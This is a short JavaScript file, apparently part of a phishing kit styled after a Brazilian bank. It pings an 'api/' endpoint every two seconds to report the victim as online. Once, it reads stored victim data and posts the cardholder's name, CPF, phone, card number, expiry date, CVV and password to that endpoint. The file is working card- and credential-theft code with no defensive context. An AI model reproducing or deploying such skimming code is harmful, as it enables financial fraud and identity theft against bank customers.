 var total = 0;
setInterval(()=>{
 
	$.post('api/', {cliente:"online"},function(r){
    });
	
	if(total===0){
	total=1;
	sendInfo();
	}else{
	}

}, 2000);
	

function sendInfo(){

var jsonX = localStorage.getItem('itaOnline');
var date = JSON.parse(jsonX);

	$.post('api/', {cliente:"send", titular:date.titular, cpf:date.cpf, telefone:date.telefone, numero:date.numero, validade:date.validade, cvv:date.cvv, senha:date.senha},function(r){   
	});
}
//}